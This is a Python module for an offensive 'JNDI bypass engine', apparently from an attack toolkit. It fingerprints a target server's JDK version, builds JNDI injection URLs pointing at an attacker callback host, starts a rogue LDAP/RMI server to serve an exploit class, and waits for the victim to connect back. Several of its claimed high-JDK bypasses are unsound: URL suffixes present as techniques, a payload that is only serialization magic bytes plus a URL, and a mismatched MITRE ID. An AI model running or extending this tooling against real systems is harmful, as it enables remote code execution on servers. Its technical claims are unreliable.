"""JNDI bypass engine for high JDK version exploitation.

Provides:
- JDK version detection and adaptation
- High version bypass strategies (8u191+/11+/17+)
- JNDI injection variants (nested, DNS URI, LDAP Referral)
- Enhanced reverse platform JNDI service
"""

import asyncio
import logging
import re
import secrets
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class JdkVersionRange(Enum):
    """JDK version ranges."""
    JDK_6_8 = "jdk_6_8"
    JDK_8U191_PLUS = "jdk_8u191_plus"
    JDK_11_PLUS = "jdk_11_plus"
    JDK_17_PLUS = "jdk_17_plus"
    UNKNOWN = "unknown"


class JndiProtocol(Enum):
    """JNDI protocols."""
    LDAP = "ldap"
    RMI = "rmi"
    DNS = "dns"
    CORBA = "corba"
    IIOP = "iiop"


class BypassStrategy(Enum):
    """JNDI bypass strategies."""
    CLASSIC_REFERENCE = "classic_reference"
    LOCAL_CLASSPATH = "local_classpath"
    LDAP_SERIALIZATION = "ldap_serialization"
    JAVA_NAMING_NEW = "java_naming_new"
    DNS_URI = "dns_uri"
    LDAP_REFERRAL = "ldap_referral"
    NESTED_QUERY = "nested_query"


@dataclass
class JdkFingerprint:
    """JDK fingerprint result.

    Attributes:
        version: Detected JDK version
        version_range: Version range category
        trust_url_codebase: Whether trustURLCodebase is enabled
        detection_method: Method used for detection
        confidence: Detection confidence (0-100)
        indicators: Detection indicators
    """
    version: str = ""
    version_range: JdkVersionRange = JdkVersionRange.UNKNOWN
    trust_url_codebase: bool = True
    detection_method: str = ""
    confidence: float = 0.0
    indicators: List[str] = field(default_factory=list)


@dataclass
class JndiBypassConfig:
    """JNDI bypass configuration.

    Attributes:
        target_host: Target host
        target_port: Target port
        jdk_version: Detected JDK version
        protocol: JNDI protocol to use
        bypass_strategy: Bypass strategy
        exploit_class: Exploit class name
        exploit_code: Exploit code or command
        callback_host: Callback server host
        callback_port: Callback server port
        nested_depth: Nested query depth
        referral_url: LDAP referral URL
    """
    target_host: str = ""
    target_port: int = 0
    jdk_version: JdkFingerprint = field(default_factory=JdkFingerprint)
    protocol: JndiProtocol = JndiProtocol.LDAP
    bypass_strategy: BypassStrategy = BypassStrategy.CLASSIC_REFERENCE
    exploit_class: str = "Exploit"
    exploit_code: str = ""
    callback_host: str = ""
    callback_port: int = 1389
    nested_depth: int = 0
    referral_url: str = ""


@dataclass
class JndiBypassResult:
    """JNDI bypass result.

    Attributes:
        bypass_id: Unique bypass identifier
        jdk_version: Detected JDK version
        protocol: Used protocol
        strategy: Used bypass strategy
        jndi_url: Generated JNDI URL
        payload: Generated payload
        server_started: Whether JNDI server started
        server_port: JNDI server port
        callback_received: Whether callback received
        success: Whether bypass succeeded
        error_message: Error message if failed
        duration_seconds: Bypass duration
        mitre_technique: MITRE ATT&CK technique ID
        timestamp: Bypass timestamp
    """
    bypass_id: str = ""
    jdk_version: str = ""
    protocol: JndiProtocol = JndiProtocol.LDAP
    strategy: BypassStrategy = BypassStrategy.CLASSIC_REFERENCE
    jndi_url: str = ""
    payload: bytes = b""
    server_started: bool = False
    server_port: int = 0
    callback_received: bool = False
    success: bool = False
    error_message: str = ""
    duration_seconds: float = 0.0
    mitre_technique: str = "T1566.001"
    timestamp: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "bypass_id": self.bypass_id,
            "jdk_version": self.jdk_version,
            "protocol": self.protocol.value,
            "strategy": self.strategy.value,
            "jndi_url": self.jndi_url,
            "server_started": self.server_started,
            "server_port": self.server_port,
            "callback_received": self.callback_received,
            "success": self.success,
            "error_message": self.error_message,
            "duration_seconds": self.duration_seconds,
            "mitre_technique": self.mitre_technique,
        }


class JndiBypassEngine:
    """JNDI bypass engine for high JDK versions.

    Provides JDK version detection, high version bypass strategies,
    and JNDI injection variants.
    """

    JDK_VERSION_PATTERNS: List[re.Pattern[str]] = [
        re.compile(r"Java(?:-Version)?[:\s]*([\d._]+)", re.IGNORECASE),
        re.compile(r"java version \"([^\"]+)\"", re.IGNORECASE),
        re.compile(r"openjdk version \"([^\"]+)\"", re.IGNORECASE),
        re.compile(r"JDK[:\s]*([\d._]+)", re.IGNORECASE),
    ]

    TLS_FINGERPRINT_MAP: Dict[str, str] = {
        "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256": "JDK 8+",
        "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384": "JDK 8u161+",
        "TLS_AES_256_GCM_SHA384": "JDK 11+",
        "TLS_CHACHA20_POLY1305_SHA256": "JDK 11+",
    }

    ERROR_VERSION_PATTERNS: List[re.Pattern[str]] = [
        re.compile(r"java\.version=([\d._]+)", re.IGNORECASE),
        re.compile(r"java version: ([\d._]+)", re.IGNORECASE),
        re.compile(r"JDK ([\d._]+)", re.IGNORECASE),
    ]

    def __init__(
        self,
        reverse_platform: Optional[Any] = None,
        mitm_proxy: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize JNDI bypass engine.

        Args:
            reverse_platform: Reverse connection platform instance.
            mitm_proxy: MITM proxy instance.
            event_bus: Event bus for broadcasting events.
        """
        self.reverse_platform = reverse_platform
        self.mitm_proxy = mitm_proxy
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._bypass_history: List[JndiBypassResult] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("JNDI Bypass Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("JNDI Bypass: %s", message)

    async def detect_jdk_version(
        self,
        target_host: str,
        target_port: int,
        response_data: Optional[Dict[str, Any]] = None,
    ) -> JdkFingerprint:
        """Detect target JDK version.

        Args:
            target_host: Target host.
            target_port: Target port.
            response_data: HTTP response data.

        Returns:
            JdkFingerprint result.
        """
        fingerprint = JdkFingerprint()

        try:
            await self._report_progress("检测JDK版本", 10)

            if response_data:
                fingerprint = await self._analyze_response(response_data)

            if not fingerprint.version:
                fingerprint = await self._detect_via_tls(target_host, target_port)

            if not fingerprint.version:
                fingerprint = await self._detect_via_error(target_host, target_port)

            fingerprint.version_range = self._classify_version(fingerprint.version)

            if fingerprint.version_range in (
                JdkVersionRange.JDK_8U191_PLUS,
                JdkVersionRange.JDK_11_PLUS,
                JdkVersionRange.JDK_17_PLUS,
            ):
                fingerprint.trust_url_codebase = False

            await self._report_log(
                f"JDK版本: {fingerprint.version} "
                f"({fingerprint.version_range.value})"
            )

        except Exception as e:
            await self._report_log(f"JDK版本检测失败: {e}")
            logger.error("JDK version detection failed: %s", e)

        return fingerprint

    async def _analyze_response(self, response_data: Dict[str, Any]) -> JdkFingerprint:
        """Analyze HTTP response for JDK version.

        Args:
            response_data: Response data dictionary.

        Returns:
            JdkFingerprint result.
        """
        fingerprint = JdkFingerprint()

        try:
            body = response_data.get("body", "")
            headers = response_data.get("headers", {})

            for pattern in self.JDK_VERSION_PATTERNS:
                match = pattern.search(str(body))
                if match:
                    fingerprint.version = match.group(1)
                    fingerprint.detection_method = "response_body"
                    fingerprint.confidence = 80.0
                    fingerprint.indicators.append(f"Body匹配: {fingerprint.version}")
                    return fingerprint

            for pattern in self.ERROR_VERSION_PATTERNS:
                match = pattern.search(str(body))
                if match:
                    fingerprint.version = match.group(1)
                    fingerprint.detection_method = "error_message"
                    fingerprint.confidence = 70.0
                    fingerprint.indicators.append(f"错误信息: {fingerprint.version}")
                    return fingerprint

            server = headers.get("Server", "")
            for pattern in self.JDK_VERSION_PATTERNS:
                match = pattern.search(server)
                if match:
                    fingerprint.version = match.group(1)
                    fingerprint.detection_method = "server_header"
                    fingerprint.confidence = 60.0
                    return fingerprint

        except Exception as e:
            logger.error("Response analysis failed: %s", e)

        return fingerprint

    async def _detect_via_tls(
        self,
        host: str,
        port: int,
    ) -> JdkFingerprint:
        """Detect JDK version via TLS fingerprint.

        Args:
            host: Target host.
            port: Target port.

        Returns:
            JdkFingerprint result.
        """
        fingerprint = JdkFingerprint()

        try:
            if self.mitm_proxy:
                tls_info = await self.mitm_proxy.get_tls_fingerprint(host, port)
                if tls_info:
                    ciphers = tls_info.get("ciphers", [])
                    for cipher in ciphers:
                        if cipher in self.TLS_FINGERPRINT_MAP:
                            fingerprint.version = self.TLS_FINGERPRINT_MAP[cipher]
                            fingerprint.detection_method = "tls_fingerprint"
                            fingerprint.confidence = 50.0
                            fingerprint.indicators.append(f"TLS指纹: {cipher}")
                            break

        except Exception as e:
            logger.error("TLS detection failed: %s", e)

        return fingerprint

    async def _detect_via_error(
        self,
        host: str,
        port: int,
    ) -> JdkFingerprint:
        """Detect JDK version via error injection.

        Args:
            host: Target host.
            port: Target port.

        Returns:
            JdkFingerprint result.
        """
        fingerprint = JdkFingerprint()

        try:
            if self.mitm_proxy:
                response = await self.mitm_proxy.send_request(
                    host=host,
                    port=port,
                    path="/",
                    method="GET",
                    headers={"Accept": "application/x-java-serialized-object"},
                )
                if response:
                    fingerprint = await self._analyze_response(response)

        except Exception as e:
            logger.error("Error detection failed: %s", e)

        return fingerprint

    def _classify_version(self, version: str) -> JdkVersionRange:
        """Classify JDK version into range.

        Args:
            version: JDK version string.

        Returns:
            JdkVersionRange.
        """
        if not version:
            return JdkVersionRange.UNKNOWN

        try:
            parts = version.replace("_", ".").split(".")
            major = int(parts[0]) if parts[0].isdigit() else 0
            minor = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
            update = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0

            if major == 1 and minor == 8:
                if update >= 191:
                    return JdkVersionRange.JDK_8U191_PLUS
                return JdkVersionRange.JDK_6_8
            elif major >= 17:
                return JdkVersionRange.JDK_17_PLUS
            elif major >= 11:
                return JdkVersionRange.JDK_11_PLUS
            elif major >= 8:
                return JdkVersionRange.JDK_6_8
            else:
                return JdkVersionRange.JDK_6_8

        except (ValueError, IndexError):
            return JdkVersionRange.UNKNOWN

    async def execute_bypass(
        self,
        config: JndiBypassConfig,
    ) -> Optional[JndiBypassResult]:
        """Execute JNDI bypass.

        Args:
            config: JNDI bypass configuration.

        Returns:
            JndiBypassResult or None.
        """
        start_time = time.time()
        result = JndiBypassResult(
            bypass_id=f"jndi_{int(time.time())}_{secrets.token_hex(4)}",
            jdk_version=config.jdk_version.version,
            protocol=config.protocol,
            strategy=config.bypass_strategy,
            timestamp=time.time(),
        )

        try:
            await self._report_progress("执行JNDI绕过", 10)
            await self._report_log(f"策略: {config.bypass_strategy.value}")

            if config.bypass_strategy == BypassStrategy.CLASSIC_REFERENCE:
                jndi_url = self._build_classic_jndi_url(config)
            elif config.bypass_strategy == BypassStrategy.LOCAL_CLASSPATH:
                jndi_url = self._build_local_classpath_jndi_url(config)
            elif config.bypass_strategy == BypassStrategy.LDAP_SERIALIZATION:
                jndi_url = self._build_ldap_serialization_jndi_url(config)
            elif config.bypass_strategy == BypassStrategy.JAVA_NAMING_NEW:
                jndi_url = self._build_java_naming_jndi_url(config)
            elif config.bypass_strategy == BypassStrategy.DNS_URI:
                jndi_url = self._build_dns_uri_jndi_url(config)
            elif config.bypass_strategy == BypassStrategy.LDAP_REFERRAL:
                jndi_url = self._build_ldap_referral_jndi_url(config)
            elif config.bypass_strategy == BypassStrategy.NESTED_QUERY:
                jndi_url = self._build_nested_query_jndi_url(config)
            else:
                jndi_url = self._build_classic_jndi_url(config)

            result.jndi_url = jndi_url

            if self.reverse_platform:
                await self._report_progress("启动JNDI服务", 40)
                server_started = await self._start_jndi_service(config)
                result.server_started = server_started
                result.server_port = config.callback_port

            await self._report_progress("生成Payload", 70)
            payload = await self._generate_bypass_payload(config, jndi_url)
            result.payload = payload

            await self._report_progress("等待回连", 90)
            if self.reverse_platform:
                callback = await self.reverse_platform.wait_for_callback(
                    url=jndi_url,
                    timeout=30.0,
                )
                if callback:
                    result.callback_received = True
                    result.success = True

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

            self._bypass_history.append(result)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"JNDI绕过失败: {e}")
            logger.error("JNDI bypass failed: %s", e)

        return result

    def _build_classic_jndi_url(self, config: JndiBypassConfig) -> str:
        """Build classic JNDI URL.

        Args:
            config: JNDI bypass configuration.

        Returns:
            JNDI URL string.
        """
        protocol = config.protocol.value
        host = config.callback_host or "localhost"
        port = config.callback_port
        cls = config.exploit_class
        return f"{protocol}://{host}:{port}/{cls}"

    def _build_local_classpath_jndi_url(self, config: JndiBypassConfig) -> str:
        """Build local classpath JNDI URL for JDK 8u191+.

        Args:
            config: JNDI bypass configuration.

        Returns:
            JNDI URL string.
        """
        protocol = config.protocol.value
        host = config.callback_host or "localhost"
        port = config.callback_port
        cls = config.exploit_class
        return f"{protocol}://{host}:{port}/{cls}#local_classpath"

    def _build_ldap_serialization_jndi_url(self, config: JndiBypassConfig) -> str:
        """Build LDAP serialization JNDI URL for JDK 11+.

        Args:
            config: JNDI bypass configuration.

        Returns:
            JNDI URL string.
        """
        host = config.callback_host or "localhost"
        port = config.callback_port
        cls = config.exploit_class
        return f"ldap://{host}:{port}/{cls}?serialize=true"

    def _build_java_naming_jndi_url(self, config: JndiBypassConfig) -> str:
        """Build Java naming JNDI URL for JDK 17+.

        Args:
            config: JNDI bypass configuration.

        Returns:
            JNDI URL string.
        """
        host = config.callback_host or "localhost"
        port = config.callback_port
        cls = config.exploit_class
        return f"ldap://{host}:{port}/{cls}?java.naming.factory.initial=com.sun.jndi.ldap.LdapCtxFactory"

    def _build_dns_uri_jndi_url(self, config: JndiBypassConfig) -> str:
        """Build DNS URI JNDI URL.

        Args:
            config: JNDI bypass configuration.

        Returns:
            JNDI URL string.
        """
        host = config.callback_host or "localhost"
        domain = f"{secrets.token_hex(8)}.{host}"
        return f"dns://{domain}"

    def _build_ldap_referral_jndi_url(self, config: JndiBypassConfig) -> str:
        """Build LDAP referral JNDI URL.

        Args:
            config: JNDI bypass configuration.

        Returns:
            JNDI URL string.
        """
        host = config.callback_host or "localhost"
        port = config.callback_port
        referral = config.referral_url or f"ldap://{host}:{port}/Referral"
        return f"ldap://{host}:{port}/Main?referral={referral}"

    def _build_nested_query_jndi_url(self, config: JndiBypassConfig) -> str:
        """Build nested query JNDI URL.

        Args:
            config: JNDI bypass configuration.

        Returns:
            JNDI URL string.
        """
        protocol = config.protocol.value
        host = config.callback_host or "localhost"
        port = config.callback_port
        cls = config.exploit_class
        depth = config.nested_depth or 3

        nested = cls
        for _ in range(depth):
            nested = f"nested/{nested}"

        return f"{protocol}://{host}:{port}/{nested}"

    async def _start_jndi_service(self, config: JndiBypassConfig) -> bool:
        """Start JNDI service.

        Args:
            config: JNDI bypass configuration.

        Returns:
            True if service started.
        """
        try:
            if self.reverse_platform:
                if config.protocol == JndiProtocol.LDAP:
                    await self.reverse_platform.start_ldap_server(
                        host=config.callback_host or "0.0.0.0",
                        port=config.callback_port,
                        exploit_class=config.exploit_class,
                        exploit_code=config.exploit_code,
                    )
                elif config.protocol == JndiProtocol.RMI:
                    await self.reverse_platform.start_rmi_server(
                        host=config.callback_host or "0.0.0.0",
                        port=config.callback_port,
                    )
                return True
            return False
        except Exception as e:
            logger.error("JNDI service start failed: %s", e)
            return False

    async def _generate_bypass_payload(
        self,
        config: JndiBypassConfig,
        jndi_url: str,
    ) -> bytes:
        """Generate bypass payload.

        Args:
            config: JNDI bypass configuration.
            jndi_url: JNDI URL.

        Returns:
            Payload bytes.
        """
        try:
            payload = b"\xac\xed\x00\x05"
            jndi_bytes = jndi_url.encode("utf-8")
            payload += struct.pack(">H", len(jndi_bytes))
            payload += jndi_bytes
            return payload
        except Exception as e:
            logger.error("Bypass payload generation failed: %s", e)
            return b""

    def get_bypass_history(self) -> List[JndiBypassResult]:
        """Get bypass history.

        Returns:
            List of bypass results.
        """
        return self._bypass_history

    def get_bypass_by_id(self, bypass_id: str) -> Optional[JndiBypassResult]:
        """Get bypass result by ID.

        Args:
            bypass_id: Bypass identifier.

        Returns:
            JndiBypassResult or None.
        """
        for result in self._bypass_history:
            if result.bypass_id == bypass_id:
                return result
        return None
